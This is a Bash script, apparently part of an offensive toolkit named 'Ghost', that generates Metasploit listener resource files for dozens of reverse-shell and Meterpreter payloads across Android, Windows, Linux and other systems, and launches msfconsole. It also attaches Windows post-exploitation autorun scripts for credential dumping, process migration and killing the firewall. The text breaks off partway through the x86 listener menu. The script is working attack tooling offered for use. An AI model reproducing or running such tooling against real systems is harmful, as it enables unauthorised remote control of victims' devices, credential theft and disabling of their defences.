#!/bin/bash

# Working directory
directory=$(pwd)

# Host discovery
lanip=$(ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1 -d'/')
lanip6=$(ip addr | grep 'state UP' -A4 | tail -n1 | awk '{print $2}' | cut -f1 -d'/')
publicip=$(dig +short myip.opendns.com @resolver1.opendns.com)
hostn=$(host "$publicip" | awk '{print $5}' | sed 's/.$//')

# Android payloads
androidhttps="android/meterpreter/reverse_https"
androidhttp="android/meterpreter/reverse_http"
androidtcp="android/meterpreter/reverse_tcp"
androidshellhttp="android/shell/reverse_http"
androidshelltcp="android/shell/reverse_tcp"

# Windows payloads x64
wldsm64bingtcp="windows/shell_bind_tcp"
wldsm64shelltcp="windows/shell/reverse_tcp"
wldsm64tcp="windows/meterpreter/reverse_tcp"
wldsm64tcpdns="windows/meterpreter/reverse_tcp_dns"
wldsm64http="windows/meterpreter/reverse_http"
wldsm64https="windows/meterpreter/reverse_https"
wldsm64tcpuuid="windows/meterpreter/reverse_tcp_uuid"
wldsm64winhttp="windows/meterpreter/reverse_winhttp"
wldsm64winhttps="windows/meterpreter/reverse_winhttps"

# Linux Payloads x86
lx86tcp="linux/x86/meterpreter_reverse_tcp"
lx86https="linux/x86/meterpreter_reverse_https"
lx86http="linux/x86/meterpreter_reverse_http"
lx86tcpuuid="linux/x86/meterpreter/reverse_tcp_uuid"
lx86ipv6tcp="linux/x86/meterpreter/reverse_ipv6_tcp"
lx86nonxtcp="linux/x86/meterpreter/reverse_nonx_tcp"
lx86ppcshelltcp="linux/ppc/shell_reverse_tcp"
lx86shelltcp="linux/x86/shell_reverse_tcp"
lx86armleshelltcp="osx/armle/shell_reverse_tcp"
lx86osxshelltcp="osx/armle/shell_reverse_tcp"
lx86osxppcshelltcp="osx/ppc/shell_reverse_tcp"
lx86bsdshelltcp="bsd/x86/shell/reverse_tcp"
lx86solarisshelltcp="solaris/x86/shell_reverse_tcp"

# Linux Payloads x64
li64tcp="linux/x64/meterpreter_reverse_tcp"
li64https="linux/x64/meterpreter_reverse_https"
li64http="linux/x64/meterpreter_reverse_http"
li64tcpuuid="linux/x64/meterpreter/reverse_tcp_uuid"
li64ipv6tcp="linux/x64/meterpreter/reverse_ipv6_tcp"
li64nonxtcp="linux/x64/meterpreter/reverse_nonx_tcp"
li64ppcshelltcp="linux/ppc/shell_reverse_tcp"
li64shelltcp="linux/x64/shell_reverse_tcp"
li64armleshelltcp="osx/armle/shell_reverse_tcp"
li64osxshelltcp="osx/armle/shell_reverse_tcp"
li64osxppcshelltcp="osx/ppc/shell_reverse_tcp"
li64bsdshelltcp="bsd/x64/shell/reverse_tcp"
li64solarisshelltcp="solaris/x64/shell_reverse_tcp"

# Linux question listener
thetargetlinux () {
echo ""
echo -e "${White} Set lhost"
echo ""
echo -e "${White} IPV4 ${Blue}(${lanip})"
echo -e "${White} IPV6 ${Blue}(${lanip6})"
echo -e "${White} IP   ${Blue}(${publicip})"
echo ""
echo -ne "${White} Ghost > ${Yellow}"
read linuxlhostx
echo ""
echo -e "${White} Set lport"
echo ""
echo -ne "${White} Ghost > ${Yellow}"
read linuxlportx
echo ""
echo -e "${White} Listener name"
echo ""
echo -ne "${White} Ghost > ${Yellow}"
read linuxnamex
}

# Windows question listener
thewindowstarget () {
echo ""
echo -e "${White} Set lhost"
echo ""
echo -e "${White} IPV4 ${Blue}(${lanip})"
echo -e "${White} IPV6 ${Blue}(${lanip6})"
echo -e "${White} IP   ${Blue}(${publicip})"
echo ""
echo -ne "${White} Ghost > ${Yellow}"
read wdmlhost
echo ""
echo -e "${White} Set lport"
echo ""
echo -ne "${White} Ghost > ${Yellow}"
read wdmport
echo ""
echo -e "${White} Listener name"
echo ""
echo -ne "${White} Ghost > ${Yellow}"
read wdmname
}

# Android question listener
androidquest () {
echo ""
echo -e "${White} Set lhost"
echo ""
echo -e "${White} IPV4 ${Blue}(${lanip})"
echo -e "${White} IPV6 ${Blue}(${lanip6})"
echo -e "${White} IP   ${Blue}(${publicip})"
echo ""
echo -ne "${White} Ghost > ${Yellow}"
read lhdroid
echo ""
echo -e "${White} Set lport"
echo ""
echo -ne "${White} Ghost > ${Yellow}"
read lpdroid
echo ""
echo -e "${White} Listener name"
echo ""
echo -ne "${White} Ghost > ${Yellow}"
read nmdroid
}

# Colors
Black='\033[1;30m'
Red='\033[1;31m'
Green='\033[1;32m'
Yellow='\033[1;33m'
Blue='\033[1;34m'
Purple='\033[1;35m'
Cyan='\033[1;36m'
White='\033[1;37m'
NC='\033[0m'
blue='\033[0;34m'
white='\033[0;37m'
lred='\033[0;31m'

# Check root
        if [ $(id -u) -ne 0 ]; then
        echo -e "${Blue} You must be root user to run the script"
	echo -e "${Blue} You must first run the Ghost script"
exit

fi

# Presentation of the script
banner () {
echo -e "${Blue}       ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗                                        "
echo -e "${Blue}      ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝                                        "
echo -e "${Blue}      ██║  ███╗███████║██║   ██║███████╗   ██║         ${White}By ${Blue}AlvinPix        "
echo -e "${Blue}      ██║   ██║██╔══██║██║   ██║╚════██║   ██║                                           "
echo -e "${Blue}  The ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   Listeners                               "
echo -e "${Blue}       ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝                                           "
}

# The main menu
ghostlistener () {
clear
echo ""
banner
echo ""
echo -e "${White} [${Yellow}0${White}] Return to main menu"
echo ""
echo -e "${White} [${Yellow}1${White}] Listeners for payload linux"
echo -e "${White} [${Yellow}2${White}] Listeners for payload windows"
echo -e "${White} [${Yellow}3${White}] Listeners for payload android"
echo ""
echo -e "${White} [${Yellow}4${White}] Load a saved Listener"
echo -e "${White} [${Yellow}5${White}] Jump to msfconsole"
echo -e "${White} [${Yellow}6${White}] Windows post exploit"
echo ""
echo -e "${White} [${Yellow}7${White}] Remove all listener"
echo ""
echo -ne "${White} Ghost > ${Yellow}"
read listeneropts

case $listeneropts in

0)
cd $directory
./Ghost.sh
ghostlistener ;;

1)
linuxln ;;

2)
windowsln ;;

3)
androidln ;;

4)
cd $directory/Listeners
echo ""
lsd -A -l
echo ""
echo -e "${White} Enter listener name"
echo ""
echo -ne "${White} Ghost > ${Yellow}"
read lnname
echo ""
systemctl start postgresql
systemctl status postgresql
sleep 2
sudo msfdb init && msfconsole -r $lnname
echo ""
systemctl stop postgresql
systemctl status postgresql
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

5)
echo ""
systemctl start postgresql
systemctl status postgresql
sleep 2
sudo msfdb init && msfconsole
echo ""
systemctl stop postgresql
systemctl status postgresql
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

6)
postexploits ;;

7)
echo -e "${White} Removing listeners from the ${Blue}(Listeners) ${White}folder"
cd $directory/Listeners
rm -rf *
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

* )
echo -e "${White} The option is not valid please choose a number"
sleep 1
ghostlistener ;;
esac
}


# Windows post exploit module
postexploits () {
echo ""
echo -e "${White}              ${Blue}(Windows) (post exploit)"
echo ""
echo -e "${White} [${Yellow}1${White}] sysinfo.rc"
echo -e "${White} [${Yellow}2${White}] cred_dump.rc"
echo -e "${White} [${Yellow}3${White}] fast_migrate.rc"
echo -e "${White} [${Yellow}4${White}] gather.rc"
echo -e "${White} [${Yellow}5${White}] auto_migrate+killfirewall.rc"
echo ""
echo -e "${White} [${Yellow}6${White}] Return to main menu"
echo ""
echo -ne "${White} Ghost > ${Yellow}"
read postmodule

case $postmodule in

1)
echo ""
echo -e "${White} The listener name"
echo ""
cd $directory/Listeners
lsd -A -l
echo ""
echo -ne "${White} Ghost > ${Yellow}"
read addpostexs
echo "set AutoRunScript multi_console_command -rc $directory/Postexploit/sysinfo.rc" >> "${addpostexs}"
echo ""
echo -e "${White} Post exploit loaded ${Blue}(sysinfo.rc)${White} added to ${Blue}(${addpostexs})"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

2)
echo ""
echo -e "${White} The listener name"
echo ""
cd $directory/Listeners
lsd -A -l
echo ""
echo -ne "${White} Ghost > ${Yellow}"
read addpostexs
echo "set AutoRunScript multi_console_command -rc $directory/Postexploit/cred_dump.rc" >> "${addpostexs}"
echo ""
echo -e "${White} Post exploit loaded ${Blue}(cred_dump.rc)${White} added to ${Blue}(${addpostexs})"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

3)
echo ""
echo -e "${White} The listener name"
echo ""
cd $directory/Listeners
lsd -A -l
echo ""
echo -ne "${White} Ghost > ${Yellow}"
read addpostexs
echo "set AutoRunScript multi_console_command -rc $directory/Postexploit/fast_migrate.rc" >> "${addpostexs}"
echo ""
echo -e "${White} Post exploit loaded ${Blue}(fast_migrate.rc)${White} added to ${Blue}(${addpostexs})"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

4)
echo ""
echo -e "${White} The listener name"
echo ""
cd $directory/Listeners
lsd -A -l
echo ""
echo -ne "${White} Ghost > ${Yellow}"
read addpostexs
echo "set AutoRunScript multi_console_command -rc $directory/Postexploit/gather.rc" >> "${addpostexs}"
echo ""
echo -e "${White} Post exploit loaded ${Blue}(gather.rc)${White} added to ${Blue}(${addpostexs})"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

5)
echo ""
echo -e "${White} The listener name"
echo ""
cd $directory/Listeners
lsd -A -l
echo ""
echo -ne "${White} Ghost > ${Yellow}"
read addpostexs
echo "set AutoRunScript multi_console_command -rc $directory/Postexploit/auto_migrate+killfirewall.rc" >> "${addpostexs}"
echo ""
echo -e "${White} Post exploit loaded ${Blue}(auto_migrate+killfirewall.rc)${White} added to ${Blue}(${addpostexs})"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

6)
ghostlistener ;;

* )
echo -e "${White} The option is not valid please choose a number"
sleep 1
ghostlistener ;;
esac
}

# Select the architecture linux
linuxln () {
echo ""
echo -e "${White} Select architecture ${Blue}(Linux)"
echo ""
echo -e "${White} [${Yellow}1${White}] Return to main menu"
echo -e "${White} [${Yellow}2${White}] Architecture x64"
echo -e "${White} [${Yellow}3${White}] Architecture x86"
echo ""
echo -ne "${White} Ghost > ${Yellow}"
read architechln

case $architechln in

1)
ghostlistener ;;

2)
lnulistener64 ;;

3)
lnilisteners86 ;;

* )
echo -e "${White} The option is not valid please choose a number"
sleep 1
ghostlistener ;;
esac
}

# Linux crate listener x64
lnulistener64 () {
echo ""
echo -e "${White}              ${Blue}(Linux) (x64)"
echo ""
echo -e "${White} [${Yellow}1${White}] ${li64tcp}"
echo -e "${White} [${Yellow}2${White}] ${li64https}"
echo -e "${White} [${Yellow}3${White}] ${li64http}"
echo -e "${White} [${Yellow}4${White}] ${li64tcpuuid}"
echo -e "${White} [${Yellow}5${White}] ${li64ipv6tcp}"
echo -e "${White} [${Yellow}6${White}] ${li64nonxtcp}"
echo -e "${White} [${Yellow}7${White}] ${li64ppcshelltcp}"
echo -e "${White} [${Yellow}8${White}] ${li64shelltcp}"
echo -e "${White} [${Yellow}9${White}] ${li64armleshelltcp}"
echo ""
echo -e "${White} [${Yellow}10${White}] ${li64osxshelltcp}"
echo -e "${White} [${Yellow}11${White}] ${li64osxppcshelltcp}"
echo -e "${White} [${Yellow}12${White}] ${li64bsdshelltcp}"
echo -e "${White} [${Yellow}13${White}] ${li64solarisshelltcp}"
echo ""
echo -e "${White} [${Yellow}14${White}] Return to main menu"
echo ""
echo -ne "${White} Ghost > ${Yellow}"
read linuxlistenerscreate

case $linuxlistenerscreate in

14)
ghostlistener ;;

1)
thetargetlinux
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${linuxlhostx})"
echo -e "${White} LPORT    ${Blue}(${linuxlportx})"
echo -e "${White} NAME     ${Blue}(${linuxnamex}.rc)"
echo -e "${White} PAYLOAD  ${Blue}(${li64tcp})"
echo ""
echo -e "${White} Creating listener ${Blue}(${linuxnamex}.rc)${White}..."
cd $directory/Listeners
touch "$linuxnamex.rc"
echo use exploit/multi/handler >> "$linuxnamex.rc"
echo set PAYLOAD $li64tcp >> "$linuxnamex.rc"
echo set LHOST $linuxlhostx >> "$linuxnamex.rc"
echo set LPORT $linuxlportx >> "$linuxnamex.rc"
echo set ExitOnSession false >> "$linuxnamex.rc"
echo exploit -j >> "$linuxnamex.rc"
echo ""
echo -e "${White} Ready listener saved in ${Yellow}($directory/Listeners/$linuxnamex.rc)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

2)
thetargetlinux
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${linuxlhostx})"
echo -e "${White} LPORT    ${Blue}(${linuxlportx})"
echo -e "${White} NAME     ${Blue}(${linuxnamex}.rc)"
echo -e "${White} PAYLOAD  ${Blue}(${li64https})"
echo ""
echo -e "${White} Creating listener ${Blue}(${linuxnamex}.rc)${White}..."
cd $directory/Listeners
touch "$linuxnamex.rc"
echo use exploit/multi/handler >> "$linuxnamex.rc"
echo set PAYLOAD $li64https >> "$linuxnamex.rc"
echo set LHOST $linuxlhostx >> "$linuxnamex.rc"
echo set LPORT $linuxlportx >> "$linuxnamex.rc"
echo set ExitOnSession false >> "$linuxnamex.rc"
echo exploit -j >> "$linuxnamex.rc"
echo ""
echo -e "${White} Ready listener saved in ${Yellow}($directory/Listeners/$linuxnamex.rc)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

3)
thetargetlinux
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${linuxlhostx})"
echo -e "${White} LPORT    ${Blue}(${linuxlportx})"
echo -e "${White} NAME     ${Blue}(${linuxnamex}.rc)"
echo -e "${White} PAYLOAD  ${Blue}(${li64http})"
echo ""
echo -e "${White} Creating listener ${Blue}(${linuxnamex}.rc)${White}..."
cd $directory/Listeners
touch "$linuxnamex.rc"
echo use exploit/multi/handler >> "$linuxnamex.rc"
echo set PAYLOAD $li64http >> "$linuxnamex.rc"
echo set LHOST $linuxlhostx >> "$linuxnamex.rc"
echo set LPORT $linuxlportx >> "$linuxnamex.rc"
echo set ExitOnSession false >> "$linuxnamex.rc"
echo exploit -j >> "$linuxnamex.rc"
echo ""
echo -e "${White} Ready listener saved in ${Yellow}($directory/Listeners/$linuxnamex.rc)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

4)
thetargetlinux
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${linuxlhostx})"
echo -e "${White} LPORT    ${Blue}(${linuxlportx})"
echo -e "${White} NAME     ${Blue}(${linuxnamex}.rc)"
echo -e "${White} PAYLOAD  ${Blue}(${li64tcpuuid})"
echo ""
echo -e "${White} Creating listener ${Blue}(${linuxnamex}.rc)${White}..."
cd $directory/Listeners
touch "$linuxnamex.rc"
echo use exploit/multi/handler >> "$linuxnamex.rc"
echo set PAYLOAD $li64tcpuuid >> "$linuxnamex.rc"
echo set LHOST $linuxlhostx >> "$linuxnamex.rc"
echo set LPORT $linuxlportx >> "$linuxnamex.rc"
echo set ExitOnSession false >> "$linuxnamex.rc"
echo exploit -j >> "$linuxnamex.rc"
echo ""
echo -e "${White} Ready listener saved in ${Yellow}($directory/Listeners/$linuxnamex.rc)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

5)
thetargetlinux
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${linuxlhostx})"
echo -e "${White} LPORT    ${Blue}(${linuxlportx})"
echo -e "${White} NAME     ${Blue}(${linuxnamex}.rc)"
echo -e "${White} PAYLOAD  ${Blue}(${li64ipv6tcp})"
echo ""
echo -e "${White} Creating listener ${Blue}(${linuxnamex}.rc)${White}..."
cd $directory/Listeners
touch "$linuxnamex.rc"
echo use exploit/multi/handler >> "$linuxnamex.rc"
echo set PAYLOAD $li64ipv6tcp >> "$linuxnamex.rc"
echo set LHOST $linuxlhostx >> "$linuxnamex.rc"
echo set LPORT $linuxlportx >> "$linuxnamex.rc"
echo set ExitOnSession false >> "$linuxnamex.rc"
echo exploit -j >> "$linuxnamex.rc"
echo ""
echo -e "${White} Ready listener saved in ${Yellow}($directory/Listeners/$linuxnamex.rc)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

6)
thetargetlinux
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${linuxlhostx})"
echo -e "${White} LPORT    ${Blue}(${linuxlportx})"
echo -e "${White} NAME     ${Blue}(${linuxnamex}.rc)"
echo -e "${White} PAYLOAD  ${Blue}(${li64nonxtcp})"
echo ""
echo -e "${White} Creating listener ${Blue}(${linuxnamex}.rc)${White}..."
cd $directory/Listeners
touch "$linuxnamex.rc"
echo use exploit/multi/handler >> "$linuxnamex.rc"
echo set PAYLOAD $li64nonxtcp >> "$linuxnamex.rc"
echo set LHOST $linuxlhostx >> "$linuxnamex.rc"
echo set LPORT $linuxlportx >> "$linuxnamex.rc"
echo set ExitOnSession false >> "$linuxnamex.rc"
echo exploit -j >> "$linuxnamex.rc"
echo ""
echo -e "${White} Ready listener saved in ${Yellow}($directory/Listeners/$linuxnamex.rc)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

7)
thetargetlinux
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${linuxlhostx})"
echo -e "${White} LPORT    ${Blue}(${linuxlportx})"
echo -e "${White} NAME     ${Blue}(${linuxnamex}.rc)"
echo -e "${White} PAYLOAD  ${Blue}(${li64ppcshelltcp})"
echo ""
echo -e "${White} Creating listener ${Blue}(${linuxnamex}.rc)${White}..."
cd $directory/Listeners
touch "$linuxnamex.rc"
echo use exploit/multi/handler >> "$linuxnamex.rc"
echo set PAYLOAD $li64ppcshelltcp >> "$linuxnamex.rc"
echo set LHOST $linuxlhostx >> "$linuxnamex.rc"
echo set LPORT $linuxlportx >> "$linuxnamex.rc"
echo set ExitOnSession false >> "$linuxnamex.rc"
echo exploit -j >> "$linuxnamex.rc"
echo ""
echo -e "${White} Ready listener saved in ${Yellow}($directory/Listeners/$linuxnamex.rc)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

8)
thetargetlinux
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${linuxlhostx})"
echo -e "${White} LPORT    ${Blue}(${linuxlportx})"
echo -e "${White} NAME     ${Blue}(${linuxnamex}.rc)"
echo -e "${White} PAYLOAD  ${Blue}(${li64shelltcp})"
echo ""
echo -e "${White} Creating listener ${Blue}(${linuxnamex}.rc)${White}..."
cd $directory/Listeners
touch "$linuxnamex.rc"
echo use exploit/multi/handler >> "$linuxnamex.rc"
echo set PAYLOAD $li64shelltcp >> "$linuxnamex.rc"
echo set LHOST $linuxlhostx >> "$linuxnamex.rc"
echo set LPORT $linuxlportx >> "$linuxnamex.rc"
echo set ExitOnSession false >> "$linuxnamex.rc"
echo exploit -j >> "$linuxnamex.rc"
echo ""
echo -e "${White} Ready listener saved in ${Yellow}($directory/Listeners/$linuxnamex.rc)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

9)
thetargetlinux
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${linuxlhostx})"
echo -e "${White} LPORT    ${Blue}(${linuxlportx})"
echo -e "${White} NAME     ${Blue}(${linuxnamex}.rc)"
echo -e "${White} PAYLOAD  ${Blue}(${li64armleshelltcp})"
echo ""
echo -e "${White} Creating listener ${Blue}(${linuxnamex}.rc)${White}..."
cd $directory/Listeners
touch "$linuxnamex.rc"
echo use exploit/multi/handler >> "$linuxnamex.rc"
echo set PAYLOAD $li64armleshelltcp >> "$linuxnamex.rc"
echo set LHOST $linuxlhostx >> "$linuxnamex.rc"
echo set LPORT $linuxlportx >> "$linuxnamex.rc"
echo set ExitOnSession false >> "$linuxnamex.rc"
echo exploit -j >> "$linuxnamex.rc"
echo ""
echo -e "${White} Ready listener saved in ${Yellow}($directory/Listeners/$linuxnamex.rc)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

10)
thetargetlinux
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${linuxlhostx})"
echo -e "${White} LPORT    ${Blue}(${linuxlportx})"
echo -e "${White} NAME     ${Blue}(${linuxnamex}.rc)"
echo -e "${White} PAYLOAD  ${Blue}(${li64osxshelltcp})"
echo ""
echo -e "${White} Creating listener ${Blue}(${linuxnamex}.rc)${White}..."
cd $directory/Listeners
touch "$linuxnamex.rc"
echo use exploit/multi/handler >> "$linuxnamex.rc"
echo set PAYLOAD $li64osxshelltcp >> "$linuxnamex.rc"
echo set LHOST $linuxlhostx >> "$linuxnamex.rc"
echo set LPORT $linuxlportx >> "$linuxnamex.rc"
echo set ExitOnSession false >> "$linuxnamex.rc"
echo exploit -j >> "$linuxnamex.rc"
echo ""
echo -e "${White} Ready listener saved in ${Yellow}($directory/Listeners/$linuxnamex.rc)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

11)
thetargetlinux
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${linuxlhostx})"
echo -e "${White} LPORT    ${Blue}(${linuxlportx})"
echo -e "${White} NAME     ${Blue}(${linuxnamex}.rc)"
echo -e "${White} PAYLOAD  ${Blue}(${li64osxppcshelltcp})"
echo ""
echo -e "${White} Creating listener ${Blue}(${linuxnamex}.rc)${White}..."
cd $directory/Listeners
touch "$linuxnamex.rc"
echo use exploit/multi/handler >> "$linuxnamex.rc"
echo set PAYLOAD $li64osxppcshelltcp >> "$linuxnamex.rc"
echo set LHOST $linuxlhostx >> "$linuxnamex.rc"
echo set LPORT $linuxlportx >> "$linuxnamex.rc"
echo set ExitOnSession false >> "$linuxnamex.rc"
echo exploit -j >> "$linuxnamex.rc"
echo ""
echo -e "${White} Ready listener saved in ${Yellow}($directory/Listeners/$linuxnamex.rc)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

12)
thetargetlinux
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${linuxlhostx})"
echo -e "${White} LPORT    ${Blue}(${linuxlportx})"
echo -e "${White} NAME     ${Blue}(${linuxnamex}.rc)"
echo -e "${White} PAYLOAD  ${Blue}(${li64bsdshelltcp})"
echo ""
echo -e "${White} Creating listener ${Blue}(${linuxnamex}.rc)${White}..."
cd $directory/Listeners
touch "$linuxnamex.rc"
echo use exploit/multi/handler >> "$linuxnamex.rc"
echo set PAYLOAD $li64bsdshelltcp >> "$linuxnamex.rc"
echo set LHOST $linuxlhostx >> "$linuxnamex.rc"
echo set LPORT $linuxlportx >> "$linuxnamex.rc"
echo set ExitOnSession false >> "$linuxnamex.rc"
echo exploit -j >> "$linuxnamex.rc"
echo ""
echo -e "${White} Ready listener saved in ${Yellow}($directory/Listeners/$linuxnamex.rc)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

13)
thetargetlinux
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${linuxlhostx})"
echo -e "${White} LPORT    ${Blue}(${linuxlportx})"
echo -e "${White} NAME     ${Blue}(${linuxnamex}.rc)"
echo -e "${White} PAYLOAD  ${Blue}(${li64solarisshelltcp})"
echo ""
echo -e "${White} Creating listener ${Blue}(${linuxnamex}.rc)${White}..."
cd $directory/Listeners
touch "$linuxnamex.rc"
echo use exploit/multi/handler >> "$linuxnamex.rc"
echo set PAYLOAD $li64solarisshelltcp >> "$linuxnamex.rc"
echo set LHOST $linuxlhostx >> "$linuxnamex.rc"
echo set LPORT $linuxlportx >> "$linuxnamex.rc"
echo set ExitOnSession false >> "$linuxnamex.rc"
echo exploit -j >> "$linuxnamex.rc"
echo ""
echo -e "${White} Ready listener saved in ${Yellow}($directory/Listeners/$linuxnamex.rc)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

* )
echo -e "${White} The option is not valid please choose a number"
sleep 1
ghostlistener ;;
esac
}

# Linux crate listener x86
lnilisteners86 () {
echo ""
echo -e "${White}              ${Blue}(Linux) (x86)"
echo ""
echo -e "${White} [${Yellow}1${White}] ${lx86tcp}"
echo -e "${White} [${Yellow}2${White}] ${lx86https}"
echo -e "${White} [${Yellow}3${White}] ${lx86http}"
echo -e "${White} [${Yellow}4${White}] ${lx86tcpuuid}"
echo -e "${White} [${Yellow}5${White}] ${lx86ipv6tcp}"
echo -e "${White} [${Yellow}6${White}] ${lx86nonxtcp}"
echo -e "${White} [${Yellow}7${White}] ${lx86ppcshelltcp}"
echo -e "${White} [${Yellow}8${White}] ${lx86shelltcp}"
echo -e "${White} [${Yellow}9${White}] ${lx86armleshelltcp}"
echo ""
echo -e "${White} [${Yellow}10${White}] ${lx86osxshelltcp}"
echo -e "${White} [${Yellow}11${White}] ${lx86osxppcshelltcp}"
echo -e "${White} [${Yellow}12${White}] ${lx86bsdshelltcp}"
echo -e "${White} [${Yellow}13${White}] ${lx86solarisshelltcp}"
echo ""
echo -e "${White} [${Yellow}14${White}] Return to main menu"
echo ""
echo -ne "${White} Ghost > ${Yellow}"
read linuxlxli86

case $linuxlxli86 in

1)
thetargetlinux
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${linuxlhostx})"
echo -e "${White} LPORT    ${Blue}(${linuxlportx})"
echo -e "${White} NAME     ${Blue}(${linuxnamex}.rc)"
echo -e "${White} PAYLOAD  ${Blue}(${lx86tcp})"
echo ""
echo -e "${White} Creating listener ${Blue}(${linuxnamex}.rc)${White}..."
cd $directory/Listeners
touch "$linuxnamex.rc"
echo use exploit/multi/handler >> "$linuxnamex.rc"
echo set PAYLOAD $lx86tcp >> "$linuxnamex.rc"
echo set LHOST $linuxlhostx >> "$linuxnamex.rc"
echo set LPORT $linuxlportx >> "$linuxnamex.rc"
echo set ExitOnSession false >> "$linuxnamex.rc"
echo exploit -j >> "$linuxnamex.rc"
echo ""
echo -e "${White} Ready listener saved in ${Yellow}($directory/Listeners/$linuxnamex.rc)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

2)
thetargetlinux
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${linuxlhostx})"
echo -e "${White} LPORT    ${Blue}(${linuxlportx})"
echo -e "${White} NAME     ${Blue}(${linuxnamex}.rc)"
echo -e "${White} PAYLOAD  ${Blue}(${lx86https})"
echo ""
echo -e "${White} Creating listener ${Blue}(${linuxnamex}.rc)${White}..."
cd $directory/Listeners
touch "$linuxnamex.rc"
echo use exploit/multi/handler >> "$linuxnamex.rc"
echo set PAYLOAD $lx86https >> "$linuxnamex.rc"
echo set LHOST $linuxlhostx >> "$linuxnamex.rc"
echo set LPORT $linuxlportx >> "$linuxnamex.rc"
echo set ExitOnSession false >> "$linuxnamex.rc"
echo exploit -j >> "$linuxnamex.rc"
echo ""
echo -e "${White} Ready listener saved in ${Yellow}($directory/Listeners/$linuxnamex.rc)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

3)
thetargetlinux
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${linuxlhostx})"
echo -e "${White} LPORT    ${Blue}(${linuxlportx})"
echo -e "${White} NAME     ${Blue}(${linuxnamex}.rc)"
echo -e "${White} PAYLOAD  ${Blue}(${lx86http})"
echo ""
echo -e "${White} Creating listener ${Blue}(${linuxnamex}.rc)${White}..."
cd $directory/Listeners
touch "$linuxnamex.rc"
echo use exploit/multi/handler >> "$linuxnamex.rc"
echo set PAYLOAD $lx86http >> "$linuxnamex.rc"
echo set LHOST $linuxlhostx >> "$linuxnamex.rc"
echo set LPORT $linuxlportx >> "$linuxnamex.rc"
echo set ExitOnSession false >> "$linuxnamex.rc"
echo exploit -j >> "$linuxnamex.rc"
echo ""
echo -e "${White} Ready listener saved in ${Yellow}($directory/Listeners/$linuxnamex.rc)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

4)
thetargetlinux
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${linuxlhostx})"
echo -e "${White} LPORT    ${Blue}(${linuxlportx})"
echo -e "${White} NAME     ${Blue}(${linuxnamex}.rc)"
echo -e "${White} PAYLOAD  ${Blue}(${lx86tcpuuid})"
echo ""
echo -e "${White} Creating listener ${Blue}(${linuxnamex}.rc)${White}..."
cd $directory/Listeners
touch "$linuxnamex.rc"
echo use exploit/multi/handler >> "$linuxnamex.rc"
echo set PAYLOAD $lx86tcpuuid >> "$linuxnamex.rc"
echo set LHOST $linuxlhostx >> "$linuxnamex.rc"
echo set LPORT $linuxlportx >> "$linuxnamex.rc"
echo set ExitOnSession false >> "$linuxnamex.rc"
echo exploit -j >> "$linuxnamex.rc"
echo ""
echo -e "${White} Ready listener saved in ${Yellow}($directory/Listeners/$linuxnamex.rc)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

5)
thetargetlinux
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${linuxlhostx})"
echo -e "${White} LPORT    ${Blue}(${linuxlportx})"
echo -e "${White} NAME     ${Blue}(${linuxnamex}.rc)"
